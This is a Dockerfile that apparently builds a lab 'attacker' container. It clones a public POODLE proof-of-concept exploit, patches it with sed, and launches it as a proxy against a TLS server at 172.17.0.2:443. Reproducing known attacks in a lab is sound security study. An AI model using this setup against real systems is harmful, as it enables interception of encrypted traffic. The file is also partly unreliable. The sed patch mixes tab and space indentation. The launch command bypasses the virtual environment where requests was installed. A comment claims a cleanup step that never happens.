# Use a modern Alpine base image for the attacker
FROM alpine:latest

# Install necessary packages:
# git: for cloning the repository
# python3: for running the script
# python3-dev: needed for some pip packages that might require compilation
# py3-pip: for pip
# py3-venv: for creating a virtual environment
RUN apk add --no-cache \
    git \
    python3 \
    python3-dev \
    py3-pip \
    build-base # build-base might be needed for some python packages' native extensions

# Set the working directory inside the container
WORKDIR /app

# Clone the POODLE PoC repository
RUN git clone https://github.com/mpgn/poodle-PoC.git poodle-PoC

# Change to the PoC directory
WORKDIR /app/poodle-PoC

# Patch poodle-exploit.py to handle non-TTY environment for 'stty size'
# This set of sed commands is more robust for Python indentation:
# 1. Insert '    try:' before the target line.
# 2. Indent the target line itself.
# 3. Insert the 'except' blocks with correct indentation.
RUN sed -i '/rows, columns = os.popen/i\    try:' poodle-exploit.py && \
    sed -i 's/rows, columns = os.popen/\trows, columns = os.popen/' poodle-exploit.py && \
    sed -i '/rows, columns = os.popen/a\    except ValueError:\n        rows, columns = 24, 80 # Default values for non-TTY\n    except:\n        rows, columns = 24, 80 # Default values for other errors' poodle-exploit.py

# Create and activate a Python virtual environment, then install requirements
# We combine these into a single RUN layer to ensure the venv setup is correct
# and to keep the image size down by cleaning up build dependencies.
RUN python3 -m venv venv && \
    . venv/bin/activate && \
    pip install requests

CMD ["python3", "poodle-exploit.py", "0.0.0.0", "1337", "172.17.0.2", "443", "--simpleProxy", "1"]

# Expose the proxy port (e.g., 1337) so you can connect to it from outside the container
EXPOSE 1337

